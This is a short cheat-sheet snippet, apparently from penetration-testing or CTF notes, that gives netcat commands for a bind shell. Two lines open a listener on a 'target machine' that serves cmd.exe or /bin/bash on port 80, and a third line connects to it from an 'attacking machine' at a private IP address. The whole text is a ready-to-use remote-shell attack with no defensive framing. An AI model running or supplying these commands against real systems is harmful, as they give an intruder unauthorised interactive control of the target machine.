# setup a listener on the target machine
nc -lvnp 80 -e "cmd.exe"
nc -lvnp 80 -e /bin/bash

# connect to the listener from the attacking machine
nc 10.10.10.20 80